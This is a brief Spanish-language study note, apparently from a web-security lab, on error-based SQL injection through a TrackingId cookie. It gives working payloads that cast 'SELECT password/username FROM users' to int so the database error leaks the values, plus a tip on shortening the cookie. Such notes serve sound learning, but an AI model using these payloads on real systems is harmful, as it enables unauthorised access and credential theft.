Esto se basa en que en ocaciones los errores provocados por las consultas SQL nos dan información de la BD por lo que podemos extraer información basándonos en estas respuestas que brinda la base de datos.

Se hacen las respectivas pruebas iniciales para detectar que es posible la inyección y posteriormente vamos a testear los errores que nos responde la BD

Dato curioso en ocaciones nos puede dar el siguiente error 
Unterminated string literal started at position 95 in SQL  esto puede deverse al largo de la consulta que estamos introduciendo por lo que eliminaremos caracteres de la cookie
```
Da error
TrackingId=ujsasfsdfsd ' and 1=CAST((SELECT password FROM users limit 1) AS int)--
```

```
Correscto nos lanza un erro  diferente con la info que buscamos
TrackingId=' and 1=CAST((SELECT password FROM users limit 1) AS int)--
TrackingId=' or 1=CAST((SELECT password FROM users limit 1) AS int)--

TrackingId=' and 1=CAST((SELECT username FROM users limit 1) AS int)--
TrackingId=' or 1=CAST((SELECT username FROM users limit 1) AS int)--

De esta manera pudieramos ir viendo los valores de la tabla users
```